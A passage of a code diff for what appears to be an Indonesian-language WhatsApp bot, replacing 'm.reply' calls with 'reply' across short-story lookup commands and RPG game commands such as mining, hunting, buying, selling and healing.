 case 'cerpen-cintaislami':{
 let hasil = await cerpen(`cinta islami`)
-m.reply(`
+reply(`
 ❏ *Judul*: ${hasil.title}
 ❏ *Author*: ${hasil.author}
 ❏ *Category*:${hasil.kategori}
@@ -3054,7 +3061,7 @@ m.reply(`
 break
 case 'cerpen-cintapertama':{
 let hasil = await cerpen(`cinta pertama`)
-m.reply(`
+reply(`
 ❏ *Judul*: ${hasil.title}
 ❏ *Author*: ${hasil.author}
 ❏ *Category*:${hasil.kategori}
@@ -3064,7 +3071,7 @@ m.reply(`
 break
 case 'cerpen-cintaromantis':{
 let hasil = await cerpen(`cinta romantis`)
-m.reply(`
+reply(`
 ❏ *Judul*: ${hasil.title}
 ❏ *Author*: ${hasil.author}
 ❏ *Category*:${hasil.kategori}
@@ -3074,7 +3081,7 @@ m.reply(`
 break
 case 'cerpen-cintasedih':{
 let hasil = await cerpen(`cinta sedih`)
-m.reply(`
+reply(`
 ❏ *Judul*: ${hasil.title}
 ❏ *Author*: ${hasil.author}
 ❏ *Category*:${hasil.kategori}
@@ -3084,7 +3091,7 @@ m.reply(`
 break
 case 'cerpen-cintasegitiga':{
 let hasil = await cerpen(`Cinta segitiga`)
-m.reply(`
+reply(`
 ❏ *Judul*: ${hasil.title}
 ❏ *Author*: ${hasil.author}
 ❏ *Category*:${hasil.kategori}
@@ -3094,7 +3101,7 @@ m.reply(`
 break
 case 'cerpen-cintasejati':{
 let hasil = await cerpen(`cinta sejati`)
-m.reply(`
+reply(`
 ❏ *Judul*: ${hasil.title}
 ❏ *Author*: ${hasil.author}
 ❏ *Category*:${hasil.kategori}
@@ -3104,7 +3111,7 @@ m.reply(`
 break
 case 'cerpen-galau':{
 let hasil = await cerpen(`galau`)
-m.reply(`
+reply(`
 ❏ *Judul*: ${hasil.title}
 ❏ *Author*: ${hasil.author}
 ❏ *Category*:${hasil.kategori}
@@ -3114,7 +3121,7 @@ m.reply(`
 break
 case 'cerpen-gokil':{
 let hasil = await cerpen(`gokil`)
-m.reply(`
+reply(`
 ❏ *Judul*: ${hasil.title}
 ❏ *Author*: ${hasil.author}
 ❏ *Category*:${hasil.kategori}
@@ -3124,7 +3131,7 @@ m.reply(`
 break
 case 'cerpen-inspiratif':{
 let hasil = await cerpen(`inspiratif`)
-m.reply(`
+reply(`
 ❏ *Judul*: ${hasil.title}
 ❏ *Author*: ${hasil.author}
 ❏ *Category*:${hasil.kategori}
@@ -3134,7 +3141,7 @@ m.reply(`
 break
 case 'cerpen-jepang':{
 let hasil = await cerpen(`jepang`)
-m.reply(`
+reply(`
 ❏ *Judul*: ${hasil.title}
 ❏ *Author*: ${hasil.author}
 ❏ *Category*:${hasil.kategori}
@@ -3144,7 +3151,7 @@ m.reply(`
 break
 case 'cerpen-kehidupan':{
 let hasil = await cerpen(`kehidupan`)
-m.reply(`
+reply(`
 ❏ *Judul*: ${hasil.title}
 ❏ *Author*: ${hasil.author}
 ❏ *Category*:${hasil.kategori}
@@ -3154,7 +3161,7 @@ m.reply(`
 break
 case 'cerpen-keluarga':{
 let hasil = await cerpen(`keluarga`)
-m.reply(`
+reply(`
 ❏ *Judul*: ${hasil.title}
 ❏ *Author*: ${hasil.author}
 ❏ *Category*:${hasil.kategori}
@@ -3164,7 +3171,7 @@ m.reply(`
 break
 case 'cerpen-kisahnyata':{
 let hasil = await cerpen(`kisah nyata`)
-m.reply(`
+reply(`
 ❏ *Judul*: ${hasil.title}
 ❏ *Author*: ${hasil.author}
 ❏ *Category*:${hasil.kategori}
@@ -3174,7 +3181,7 @@ m.reply(`
 break
 case 'cerpen-korea':{
 let hasil = await cerpen(`korea`)
-m.reply(`
+reply(`
 ❏ *Judul*: ${hasil.title}
 ❏ *Author*: ${hasil.author}
 ❏ *Category*:${hasil.kategori}
@@ -3184,7 +3191,7 @@ m.reply(`
 break
 case 'cerpen-kristen':{
 let hasil = await cerpen(`kristen`)
-m.reply(`
+reply(`
 ❏ *Judul*: ${hasil.title}
 ❏ *Author*: ${hasil.author}
 ❏ *Category*:${hasil.kategori}
@@ -3194,7 +3201,7 @@ m.reply(`
 break
 case 'cerpen-liburan':{
 let hasil = await cerpen(`liburan`)
-m.reply(`
+reply(`
 ❏ *Judul*: ${hasil.title}
 ❏ *Author*: ${hasil.author}
 ❏ *Category*:${hasil.kategori}
@@ -3204,7 +3211,7 @@ m.reply(`
 break
 case 'cerpen-malaysia':{
 let hasil = await cerpen(`malaysia`)
-m.reply(`
+reply(`
 ❏ *Judul*: ${hasil.title}
 ❏ *Author*: ${hasil.author}
 ❏ *Category*:${hasil.kategori}
@@ -3214,7 +3221,7 @@ m.reply(`
 break
 case 'cerpen-mengharukan':{
 let hasil = await cerpen(`mengharukan`)
-m.reply(`
+reply(`
 ❏ *Judul*: ${hasil.title}
 ❏ *Author*: ${hasil.author}
 ❏ *Category*:${hasil.kategori}
@@ -3224,7 +3231,7 @@ m.reply(`
 break
 case 'cerpen-misteri':{
 let hasil = await cerpen(`misteri`)
-m.reply(`
+reply(`
 ❏ *Judul*: ${hasil.title}
 ❏ *Author*: ${hasil.author}
 ❏ *Category*:${hasil.kategori}
@@ -3234,7 +3241,7 @@ m.reply(`
 break
 case 'cerpen-motivasi':{
 let hasil = await cerpen(`motivasi`)
-m.reply(`
+reply(`
 ❏ *Judul*: ${hasil.title}
 ❏ *Author*: ${hasil.author}
 ❏ *Category*:${hasil.kategori}
@@ -3244,7 +3251,7 @@ m.reply(`
 break
 case 'cerpen-nasihat':{
 let hasil = await cerpen(`nasihat`)
-m.reply(`
+reply(`
 ❏ *Judul*: ${hasil.title}
 ❏ *Author*: ${hasil.author}
 ❏ *Category*:${hasil.kategori}
@@ -3254,7 +3261,7 @@ m.reply(`
 break
 case 'cerpen-nasionalisme':{
 let hasil = await cerpen(`nasionalisme`)
-m.reply(`
+reply(`
 ❏ *Judul*: ${hasil.title}
 ❏ *Author*: ${hasil.author}
 ❏ *Category*:${hasil.kategori}
@@ -3264,7 +3271,7 @@ m.reply(`
 break
 case 'cerpen-olahraga':{
 let hasil = await cerpen(`olahraga`)
-m.reply(`
+reply(`
 ❏ *Judul*: ${hasil.title}
 ❏ *Author*: ${hasil.author}
 ❏ *Category*:${hasil.kategori}
@@ -3284,7 +3291,7 @@ reply(`
 break
 case 'cerpen-penantian':{
 let hasil = await cerpen(`penantian`)
-m.reply(`
+reply(`
 ❏ *Judul*: ${hasil.title}
 ❏ *Author*: ${hasil.author}
 ❏ *Category*:${hasil.kategori}
@@ -3294,7 +3301,7 @@ m.reply(`
 break
 case 'cerpen-pendidikan':{
 let hasil = await cerpen(`pendidikan`)
-m.reply(`
+reply(`
 ❏ *Judul*: ${hasil.title}
 ❏ *Author*: ${hasil.author}
 ❏ *Category*:${hasil.kategori}
@@ -3304,7 +3311,7 @@ m.reply(`
 break
 case 'cerpen-pengalaman':{
 let hasil = await cerpen(`pengalaman pribadi`)
-m.reply(`
+reply(`
 ❏ *Judul*: ${hasil.title}
 ❏ *Author*: ${hasil.author}
 ❏ *Category*:${hasil.kategori}
@@ -3314,7 +3321,7 @@ m.reply(`
 break
 case 'cerpen-pengorbanan':{
 let hasil = await cerpen(`pengorbanan`)
-m.reply(`
+reply(`
 ❏ *Judul*: ${hasil.title}
 ❏ *Author*: ${hasil.author}
 ❏ *Category*:${hasil.kategori}
@@ -3324,7 +3331,7 @@ m.reply(`
 break
 case 'cerpen-penyesalan':{
 let hasil = await cerpen(`penyesalan`)
-m.reply(`
+reply(`
 ❏ *Judul*: ${hasil.title}
 ❏ *Author*: ${hasil.author}
 ❏ *Category*:${hasil.kategori}
@@ -3334,7 +3341,7 @@ m.reply(`
 break
 case 'cerpen-perjuangan':{
 let hasil = await cerpen(`perjuangan`)
-m.reply(`
+reply(`
 ❏ *Judul*: ${hasil.title}
 ❏ *Author*: ${hasil.author}
 ❏ *Category*:${hasil.kategori}
@@ -3344,7 +3351,7 @@ m.reply(`
 break
 case 'cerpen-perpisahan':{
 let hasil = await cerpen(`perpisahan`)
-m.reply(`
+reply(`
 ❏ *Judul*: ${hasil.title}
 ❏ *Author*: ${hasil.author}
 ❏ *Category*:${hasil.kategori}
@@ -3354,7 +3361,7 @@ m.reply(`
 break
 case 'cerpen-persahabatan':{
 let hasil = await cerpen(`persahabatan`)
-m.reply(`
+reply(`
 ❏ *Judul*: ${hasil.title}
 ❏ *Author*: ${hasil.author}
 ❏ *Category*:${hasil.kategori}
@@ -3364,7 +3371,7 @@ m.reply(`
 break
 case 'cerpen-petualangan':{
 let hasil = await cerpen(`petualangan`)
-m.reply(`
+reply(`
 ❏ *Judul*: ${hasil.title}
 ❏ *Author*: ${hasil.author}
 ❏ *Category*:${hasil.kategori}
@@ -3374,7 +3381,7 @@ m.reply(`
 break
 case 'cerpen-ramadhan':{
 let hasil = await cerpen(`ramadhan`)
-m.reply(`
+reply(`
 ❏ *Judul*: ${hasil.title}
 ❏ *Author*: ${hasil.author}
 ❏ *Category*:${hasil.kategori}
@@ -3384,7 +3391,7 @@ m.reply(`
 break
 case 'cerpen-remaja':{
 let hasil = await cerpen(`remaja`)
-m.reply(`
+reply(`
 ❏ *Judul*: ${hasil.title}
 ❏ *Author*: ${hasil.author}
 ❏ *Category*:${hasil.kategori}
@@ -3394,7 +3401,7 @@ m.reply(`
 break
 case 'cerpen-rindu':{
 let hasil = await cerpen(`rindu`)
-m.reply(`
+reply(`
 ❏ *Judul*: ${hasil.title}
 ❏ *Author*: ${hasil.author}
 ❏ *Category*:${hasil.kategori}
@@ -3414,7 +3421,7 @@ reply(`
 break
 case 'cerpen-romantis':{
 let hasil = await cerpen(`romantis`)
-m.reply(`
+reply(`
 ❏ *Judul*: ${hasil.title}
 ❏ *Author*: ${hasil.author}
 ❏ *Category*:${hasil.kategori}
@@ -3424,7 +3431,7 @@ m.reply(`
 break
 case 'cerpen-sastra':{
 let hasil = await cerpen(`sastra`)
-m.reply(`
+reply(`
 ❏ *Judul*: ${hasil.title}
 ❏ *Author*: ${hasil.author}
 ❏ *Category*:${hasil.kategori}
@@ -3434,7 +3441,7 @@ m.reply(`
 break
 case 'cerpen-sedih':{
 let hasil = await cerpen(`sedih`)
-m.reply(`
+reply(`
 ❏ *Judul*: ${hasil.title}
 ❏ *Author*: ${hasil.author}
 ❏ *Category*:${hasil.kategori}
@@ -3444,7 +3451,7 @@ m.reply(`
 break
 case 'cerpen-sejarah':{
 let hasil = await cerpen(`sejarah`)
-m.reply(`
+reply(`
 ❏ *Judul*: ${hasil.title}
 ❏ *Author*: ${hasil.author}
 ❏ *Category*:${hasil.kategori}
@@ -3455,7 +3462,7 @@ break
 //SELESAI
 //━━━━━━━━━━━━━━━[ FITUR RPG ]━━━━━━━━━━━━━━━━━//
 case 'inventori': case 'inventory': case 'profile': case 'inv': case 'invent': {
-if (q.includes('--help')) return m.reply(examkosong)
+if (q.includes('--help')) return reply(examkosong)
 if (!isDarah){ addInventoriDarah(m.sender, DarahAwal) }
 if (!isInventory){ addInventori(m.sender) }
 if (!isInventoriBuruan){ addInventoriBuruan(m.sender) }
@@ -3474,9 +3481,9 @@ teks += `*🐑Sheep* : ${getDomba(m.sender)}\n`
 teks += `*🐄Cow* : ${getSapi(m.sender)}\n`
 teks += `*🐘Elephant* : ${getGajah(m.sender)}\n\n`
 teks += `_*${pushname}*_`
-m.reply(teks)
+reply(teks)
 } catch (err) {
-m.reply(mess.error)
+reply(mess.error)
 }
 }
 break
@@ -3486,9 +3493,9 @@ let txt = `「 *LIMIT USER* 」\n\n`
 for (let i of _limit){
 txt += `╭ *ID :* @${i.id.split("@")[0]}\n└ *Limit* : ${i.limit}\n`
 }
-m.reply(txt)
+reply(txt)
 } catch (err) {
-m.reply(mess.error)
+reply(mess.error)
 }
 }
 break
@@ -3504,16 +3511,16 @@ txt += `├ *🐑Sheep* : ${i.domba}\n`
 txt += `├ *🐄Cow* : ${i.sapi}\n`
 txt += `└ *🐘Elephant* : ${i.gajah}\n\n`
 }
-m.reply(txt)
+reply(txt)
 } catch (err) {
-m.reply(mess.error)
+reply(mess.error)
 }
 }
 break
 case 'mining': case 'mine':{
-if (q.includes('--help')) return m.reply(examkosong) 
+if (q.includes('--help')) return reply(examkosong) 
 if (!isInventory){ addInventori(m.sender) }
-if (isCekDarah < 1) return m.reply(`Kamu Lelah!, Coba Sembuhkan Menggunakan Potion`) 
+if (isCekDarah < 1) return reply(`Kamu Lelah!, Coba Sembuhkan Menggunakan Potion`) 
 try {
 let besi = [1,2,5,0,3,0,1,1,4,1,5,0,0]
 let emas = [0,1,2,3,0,0,0,1,1,0,0,2]
@@ -3532,178 +3539,178 @@ headerType: 4
 }
 SatganzDevs.sendMessage(m.chat, buttonMessage, { quoted: m })
 await sleep(7000)
-m.reply(`@${m.sender.split("@")[0]} Started Mining🎣`)     
+reply(`@${m.sender.split("@")[0]} Started Mining🎣`)     
 await sleep(1500)
 kurangDarah(m.sender, 10)
 addBesi(m.sender, besinya)
 addEmas(m.sended, emasnya)
 addEmerald(m.sender, emeraldnya)
 } catch (err) {
-m.reply(mess.error)
+reply(mess.error)
 }
 }   
 break
 case 'beli': case 'buy': {
 try {
-if (q.includes('--help')) return m.reply(examkosong) 
+if (q.includes('--help')) return reply(examkosong) 
 if (!isInventoriBuruan){ addInventoriBuruan(m.sender) } 
 if (!isInventoryMonay){ addInventoriMonay(m.sender) }
 if (!isInventory){ addInventori(m.sender) }
-if (!q) return m.reply(`Contoh : ${prefix + command} potion/baitfood/limit`)
+if (!q) return reply(`Contoh : ${prefix + command} potion/baitfood/limit`)
 var anu = args[1]
 if (args[0] === 'potion'){
 let noh = 1000 * anu
-if (!args[1]) return m.reply(`Contoh : ${prefix + command} potion 2\n 1 Potion = 1000 Money`)
-if (isMonay < noh) return m.reply('Sisa Uang Anda Tidak Cukup Untuk Membeli Potion')
+if (!args[1]) return reply(`Contoh : ${prefix + command} potion 2\n 1 Potion = 1000 Money`)
+if (isMonay < noh) return reply('Sisa Uang Anda Tidak Cukup Untuk Membeli Potion')
 kurangMonay(m.sender, noh)
 var apalu = anu * 1
 addPotion(m.sender, apalu)
 await sleep(2000)
-m.reply(`Transaksi Sukses️\n*Sisa Uangmu* : ${getMonay(m.sender)}\n*Potionmu* : ${getPotion(m.sender)}`)
+reply(`Transaksi Sukses️\n*Sisa Uangmu* : ${getMonay(m.sender)}\n*Potionmu* : ${getPotion(m.sender)}`)
 } else if (args[0] === 'baitfood'){
 let noh = 2500 * anu
-if (!args[1]) return m.reply(`Contoh : ${prefix + command} baitfood 2\n 1 Bait Food = 2500 Money`)
-if (isMonay < noh) return m.reply('Sisa Uang Anda Tidak Cukup Untuk Membeli BaitFood')
+if (!args[1]) return reply(`Contoh : ${prefix + command} baitfood 2\n 1 Bait Food = 2500 Money`)
+if (isMonay < noh) return reply('Sisa Uang Anda Tidak Cukup Untuk Membeli BaitFood')
 kurangMonay(m.sender, noh)
 var apalu = anu * 1
 addUmpan(m.sender, apalu)
 await sleep(2000)
-m.reply(`Transaksi Sukses️\n*Sisa Uangmu* : ${getMonay(m.sender)}\n*Bait Foodmu* : ${getUmpan(m.sender)}`)
+reply(`Transaksi Sukses️\n*Sisa Uangmu* : ${getMonay(m.sender)}\n*Bait Foodmu* : ${getUmpan(m.sender)}`)
 } else if (args[0] === 'limit'){
 let noh = 35000 * anu
-if (!args[1]) return m.reply(`Contoh : ${prefix + command} limit 2\n 1 Limit = 35000 Money`)
-if (isMonay < noh) return m.reply('Sisa Uang Anda Tidak Cukup Untuh Membeli Limit')
+if (!args[1]) return reply(`Contoh : ${prefix + command} limit 2\n 1 Limit = 35000 Money`)
+if (isMonay < noh) return reply('Sisa Uang Anda Tidak Cukup Untuh Membeli Limit')
 kurangMonay(m.sender, noh)
 var apalu = anu * 1
 addLimit(m.sender, apalu)
-m.reply(`Transaksi Sukses\n*Sisa Uangmu* : ${getMonay(m.sender)}\n*Limitmu* : ${getLimit(m.sender)}`)
+reply(`Transaksi Sukses\n*Sisa Uangmu* : ${getMonay(m.sender)}\n*Limitmu* : ${getLimit(m.sender)}`)
 await sleep(2000)
-} else { m.reply("Format Salah") }
+} else { reply("Format Salah") }
 } catch (err) {
-m.reply(mess.error)
+reply(mess.error)
 }
 }
 break
 case 'sel': case 'jual':{
-if (!q) return m.reply(`Contoh : ${prefix + command} fish/chicken/rabbit/sheep/cow/elephant/iron/gold/emerald`)
+if (!q) return reply(`Contoh : ${prefix + command} fish/chicken/rabbit/sheep/cow/elephant/iron/gold/emerald`)
 if (!isInventoriBuruan){ addInventoriBuruan(m.sender) } 
 if (!isInventoryMonay){ addInventoriMonay(m.sender) }
 if (!isInventory){ addInventori(m.sender) }
 try {
 var anu = args[1]
 if (args[0] === 'fish'){
-if (isIkan < anu) return m.reply(`Anda Tidak Memiliki Cukup Ikan Untuk Transaksi Ini`)
-if (!args[1]) return m.reply(`Contoh : ${prefix + command} fish 2\n 1 Fish = 1500 Money`)
+if (isIkan < anu) return reply(`Anda Tidak Memiliki Cukup Ikan Untuk Transaksi Ini`)
+if (!args[1]) return reply(`Contoh : ${prefix + command} fish 2\n 1 Fish = 1500 Money`)
 kurangIkan(m.sender, anu)
 let monaynya = 1500 * anu
 addMonay(m.sender, monaynya)
 setTimeout( () => {
-m.reply(`Transaksi Sukses\n*Uangmu* : ${getMonay(m.sender)}\n*Sisa Ikanmu* : ${getIkan(m.sender)}`)
+reply(`Transaksi Sukses\n*Uangmu* : ${getMonay(m.sender)}\n*Sisa Ikanmu* : ${getIkan(m.sender)}`)
 }, 2000) 
 } else
 if (args[0] === 'chicken'){
-if (isAyam < anu) return m.reply(`Anda Tidak Memiliki Cukup Ayam Untuk Transaksi Ini`)
-if (!args[1]) return m.reply(`Contoh : ${prefix + command} chicken 2\n 1 Chicken = 2500 Money`)
+if (isAyam < anu) return reply(`Anda Tidak Memiliki Cukup Ayam Untuk Transaksi Ini`)
+if (!args[1]) return reply(`Contoh : ${prefix + command} chicken 2\n 1 Chicken = 2500 Money`)
 kurangAyam(m.sender, anu)
 let monaynya = 2500 * anu
 addMonay(m.sender, monaynya)
 setTimeout( () => {
-m.reply(`Transaksi Sukses\n*Uangmu* : ${getMonay(m.sender)}\n*Sisa Ayammu* : ${getAyam(m.sender)}`)
+reply(`Transaksi Sukses\n*Uangmu* : ${getMonay(m.sender)}\n*Sisa Ayammu* : ${getAyam(m.sender)}`)
 }, 2000) 
 } else
 if (args[0] === 'rabbit'){
-if (isKelinci < anu) return m.reply(`Anda Tidak Memiliki Cukup Kelinci Untuk Transaksi Ini`)
-if (!args[1]) return m.reply(`Contoh : ${prefix + command} rabbit 2\n 1 Rabbit = 3000 Money`)
+if (isKelinci < anu) return reply(`Anda Tidak Memiliki Cukup Kelinci Untuk Transaksi Ini`)
+if (!args[1]) return reply(`Contoh : ${prefix + command} rabbit 2\n 1 Rabbit = 3000 Money`)
 kurangKelinci(m.sender, anu)
 let monaynya = 3000 * anu
 addMonay(m.sender, monaynya)
 setTimeout( () => {
-m.reply(`Transaksi Sukses\n*Uangmu* : ${getMonay(m.sender)}\n*Sisa Kelincimu* : ${getKelinci(m.sender)}`)
+reply(`Transaksi Sukses\n*Uangmu* : ${getMonay(m.sender)}\n*Sisa Kelincimu* : ${getKelinci(m.sender)}`)
 }, 2000) 
 } else
 if (args[0] === 'sheep'){
-if (isDomba < anu) return m.reply(`Anda Tidak Memiliki Cukup Domba Untuk Transaksi Ini`)
-if (!args[1]) return m.reply(`Contoh : ${prefix + command} domba 2\n 1 Sheep = 5000 money`)
+if (isDomba < anu) return reply(`Anda Tidak Memiliki Cukup Domba Untuk Transaksi Ini`)
+if (!args[1]) return reply(`Contoh : ${prefix + command} domba 2\n 1 Sheep = 5000 money`)
 kurangDomba(m.sender, anu)
 let monaynya = 5000 * anu
 addMonay(m.sender, monaynya)
 setTimeout( () => {
-m.reply(`Transaksi Sukses\n*Uangmu* : ${getMonay(m.sender)}\n*Sisa Dombamu* : ${getDomba(m.sender)}`)
+reply(`Transaksi Sukses\n*Uangmu* : ${getMonay(m.sender)}\n*Sisa Dombamu* : ${getDomba(m.sender)}`)
 }, 2000) 
 } else
 if (args[0] === 'cow'){
-if (isSapi < anu) return m.reply(`Anda Tidak Memiliki Cukup Sapi Untuk Transaksi Ini`)
-if (!args[1]) return m.reply(`Contoh : ${prefix + command} cow 2\n 1 Cow = 10000 Money`)
+if (isSapi < anu) return reply(`Anda Tidak Memiliki Cukup Sapi Untuk Transaksi Ini`)
+if (!args[1]) return reply(`Contoh : ${prefix + command} cow 2\n 1 Cow = 10000 Money`)
 kurangSapi(m.sender, anu)
 let monaynya = 10000 * anu
 addMonay(m.sender, monaynya)
 setTimeout( () => {
-m.reply(`Transaksi Sukses\n*Uangmu* : ${getMonay(m.sender)}\n*Sisa Sapimu* : ${getSapi(m.sender)}`)
+reply(`Transaksi Sukses\n*Uangmu* : ${getMonay(m.sender)}\n*Sisa Sapimu* : ${getSapi(m.sender)}`)
 }, 2000) 
 } else
 if (args[0] === 'elephant'){
-if (isGajah < anu) return m.reply(`Anda Tidak Memiliki Cukup Gajah Untuk Transaksi Ini`)
-if (!args[1]) return m.reply(`Contoh : ${prefix + command} elephant 2\n 1 Elephant = 15000 Money`)
+if (isGajah < anu) return reply(`Anda Tidak Memiliki Cukup Gajah Untuk Transaksi Ini`)
+if (!args[1]) return reply(`Contoh : ${prefix + command} elephant 2\n 1 Elephant = 15000 Money`)
 kurangGajah(m.sender, anu)
 let monaynya = 15000 * anu
 addMonay(m.sender, monaynya)
 setTimeout( () => {
-m.reply(`Transaksi Sukses\n*Uangmu* : ${getMonay(m.sender)}\n*Sisa Gajahmu* : ${getGajah(m.sender)}`)
+reply(`Transaksi Sukses\n*Uangmu* : ${getMonay(m.sender)}\n*Sisa Gajahmu* : ${getGajah(m.sender)}`)
 }, 2000) 
 } else
 if (args[0] === 'iron'){
-if (isBesi < anu) return m.reply(`Anda Tidak Memiliki Cukup Besi Untuk Transaksi Ini`)
-if (!args[1]) return m.reply(`Contoh : ${prefix + command} iron 2\n 1 Iron = 16000 Money`)
+if (isBesi < anu) return reply(`Anda Tidak Memiliki Cukup Besi Untuk Transaksi Ini`)
+if (!args[1]) return reply(`Contoh : ${prefix + command} iron 2\n 1 Iron = 16000 Money`)
 kurangBesi(m.sender, anu)
 let monaynya = 16000 * anu
 addMonay(m.sender, monaynya)
 setTimeout( () => {
-m.reply(`Transaksi Sukses\n*Uangmu* : ${getMonay(m.sender)}\n*Sisa Besimu* : ${getBesi(m.sender)}`)
+reply(`Transaksi Sukses\n*Uangmu* : ${getMonay(m.sender)}\n*Sisa Besimu* : ${getBesi(m.sender)}`)
 }, 2000) 
 } else
 if (args[0] === 'gold'){
-if (isEmas < anu) return m.reply(`Anda Tidak Memiliki Cukup Emas Untuk Transaksi Ini`)
-if (!args[1]) return m.reply(`Contoh : ${prefix + command} gold 2\n 1 Gold = 50000 Money`)
+if (isEmas < anu) return reply(`Anda Tidak Memiliki Cukup Emas Untuk Transaksi Ini`)
+if (!args[1]) return reply(`Contoh : ${prefix + command} gold 2\n 1 Gold = 50000 Money`)
 kurangEmas(m.sender, anu)
 let monaynya = 50000 * anu
 addMonay(m.sender, monaynya)
 setTimeout( () => {
-m.reply(`Transaksi Sukses\n*Uangmu* : ${getMonay(m.sender)}\n*Sisa Emasmu* : ${getEmas(m.sender)}`)
+reply(`Transaksi Sukses\n*Uangmu* : ${getMonay(m.sender)}\n*Sisa Emasmu* : ${getEmas(m.sender)}`)
 }, 2000) 
 } else
 if (args[0] === 'emerald'){
-if (isEmerald < anu) return m.reply(`Anda Tidak Memiliki Cukup Zamrud Untuk Transaksi Ini`)
-if (!args[1]) return m.reply(`Contoh : ${prefix + command} emerald 2\n 1 Emerald = 100000 Money`)
+if (isEmerald < anu) return reply(`Anda Tidak Memiliki Cukup Zamrud Untuk Transaksi Ini`)
+if (!args[1]) return reply(`Contoh : ${prefix + command} emerald 2\n 1 Emerald = 100000 Money`)
 kurangEmerald(m.sender, anu)
 let monaynya = 100000 * anu
 addMonay(m.sender, monaynya)
 setTimeout( () => {
-m.reply(`Transaksi Sukses\n*Uangmu* : ${getMonay(m.sender)}\n*Sisa Zamrudmu* : ${getEmerald(m.sender)}`)
+reply(`Transaksi Sukses\n*Uangmu* : ${getMonay(m.sender)}\n*Sisa Zamrudmu* : ${getEmerald(m.sender)}`)
 }, 2000) 
-} else { m.reply("Format Salah") }
+} else { reply("Format Salah") }
 } catch (err) {
-m.reply(mess.error)
+reply(mess.error)
 }
 }
 break
 case 'heal': {
-if (q.includes('--help')) return m.reply(examkosong) 
-if (!isCekDarah < 1) return m.reply('Anda Hanya Dapat Menyembuhkan Saat Darah Anda 0')
-if (isCekDarah > 100) return m.reply('Darahmu Penuh')
-if (isPotion < 1) return m.reply(`Anda Tidak Punya Potion, Coba Beli Dengan Cara Ini #buypotion jumlah`) 
+if (q.includes('--help')) return reply(examkosong) 
+if (!isCekDarah < 1) return reply('Anda Hanya Dapat Menyembuhkan Saat Darah Anda 0')
+if (isCekDarah > 100) return reply('Darahmu Penuh')
+if (isPotion < 1) return reply(`Anda Tidak Punya Potion, Coba Beli Dengan Cara Ini #buypotion jumlah`) 
 try {
 addDarah(m.sender, 100)
 kurangPotion(m.sender, 1)
-m.reply(mess.sukses)
+reply(mess.sukses)
 } catch (err) {
-m.reply(mess.error)
+reply(mess.error)
 }
 }
 break
 case 'hunt': case 'hunting': case 'berburu': case 'memburu': {
-if (q.includes('--help')) return m.reply(examkosong) 
+if (q.includes('--help')) return reply(examkosong) 
 if (!isDarah){ addInventoriDarah(m.sender, DarahAwal) }
-if (isCekDarah < 1) return m.reply('Darahmu Habis, Coba Sembuhkan Menggunakan Option') 
+if (isCekDarah < 1) return reply('Darahmu Habis, Coba Sembuhkan Menggunakan Option') 
 if (!isInventoriBuruan){ addInventoriBuruan(m.sender) }
 let luka = ["Ditusuk Duri Saat Berburu","Tergelincir ke dalam jurang saat berburu","Digaruk oleh binatang buas","Kurang teliti","Terjerat akar","Jatuh saat berburu"]
 let location = ["Jungle","Amazon forest","Tropical forest","Meadow","African forest","Mountains"]
@@ -3758,7 +3765,7 @@ headerType: 4
 }
 SatganzDevs.sendMessage(m.chat, buttonMessage, { quoted: m })      
 await sleep(1000)
-m.reply(`@${m.sender.split("@")[0]} Started Hunting In ${lokasinya}`)
+reply(`@${m.sender.split("@")[0]} Started Hunting In ${lokasinya}`)
 addIkan(m.sender, ikanmu) 
 addAyam(m.sender, ayam) 
 addKelinci(m.sender, kelinci)
@@ -3770,13 +3777,13 @@ kurangDarah(m.sender, 10)
 break
 
 case 'heal': {
-if (!global.db.data.chats[m.chat].event) return m.reply(global.fiturOff)
-if (!m.isGroup) return m.reply(mess.group)
+if (!global.db.data.chats[m.chat].event) return reply(global.fiturOff)
+if (!m.isGroup) return reply(mess.group)
 var user = global.db.data.users[m.sender]
-if (user.health >= 100) return m.reply(`Nyawa ${emot.health} Kamu Sudah Full`)
+if (user.health >= 100) return reply(`Nyawa ${emot.health} Kamu Sudah Full`)
 let heal = 40 + (user.cat * 4)
 var count = Math.max(1, Math.min(Number.MAX_SAFE_INTEGER, (isNumber(args[0]) && parseInt(args[0]) || Math.round((100 - user.health) / heal)))) * 1
-if (user.potion < count) return m.reply(`Potion ${emot.potion} Kamu Tidak Cukup, Kamu Hanya Memiliki *${user.potion}* ${emot.potion} Potion\nGunakan ${prefix + command}buy potion ${count - user.potion} Untuk Membeli ${emot.potion} Potion`)
+if (user.potion < count) return reply(`Potion ${emot.potion} Kamu Tidak Cukup, Kamu Hanya Memiliki *${user.potion}* ${emot.potion} Potion\nGunakan ${prefix + command}buy potion ${count - user.potion} Untuk Membeli ${emot.potion} Potion`)
 user.potion -= count * 1
 user.health += heal * count
 var txtrpg = `Sukses Menggunakan ${count} ${emot.potion} Potion`
@@ -3785,9 +3792,9 @@ SatganzDevs.sendButtonText(m.chat, btnrpg, txtrpg, global.ownerName, m)
 }
 break
 case 'adventure': case 'petualang': case 'berpetualang': {
-if (!global.db.data.chats[m.chat].event) return m.reply(global.fiturOff)
-if (!m.isGroup) return m.reply(mess.group)
-if (!isPrem && global.db.data.users[m.sender].limit < 1) return m.reply(global.limitEnd)
+if (!global.db.data.chats[m.chat].event) return reply(global.fiturOff)
+if (!m.isGroup) return reply(mess.group)
+if (!isPrem && global.db.data.users[m.sender].limit < 1) return reply(global.limitEnd)
 var cooldown = 300000
 var user = global.db.data.users[m.sender]
 var __timers = (new Date - user.lastadventure)
@@ -3825,11 +3832,11 @@ var btnrpg = [{ buttonId: `profile`, buttonText: { displayText: 'Profile 👦' }
 SatganzDevs.sendButtonText(m.chat, btnrpg, txtrpg, global.ownerName, m)
 if (mythic > 0) {
 user.mythic += mythic * 1
-m.reply('*Selamat anda mendapatkan item Rare yaitu*\n' + mythic + ' Mythic Crate')
+reply('*Selamat anda mendapatkan item Rare yaitu*\n' + mythic + ' Mythic Crate')
 }
 if (legendary > 0) {
 user.legendary += legendary * 1
-m.reply('*Selamat anda mendapatkan item Epic yaitu*\n' + legendary + ' Legendary Crate')
+reply('*Selamat anda mendapatkan item Epic yaitu*\n' + legendary + ' Legendary Crate')
 }
 user.health -= health * 1
 user.exp += exp * 1
@@ -3840,8 +3847,8 @@ user.common += common * 1
 user.uncommon += uncommon * 1
 user.sampah += sampah * 1
 user.lastadventure = new Date * 1
-} else m.reply(`Anda sudah berpetualang dan kelelahan, silahkan coba lagi dalam\n*⏰ ${timers}*`)
-} else m.reply('Minimal 80 health untuk bisa berpetualang, beli nyawa dulu dengan ketik *' + prefix + 'shop buy potion <jumlah>*\ndan ketik *' + prefix + 'heal*')
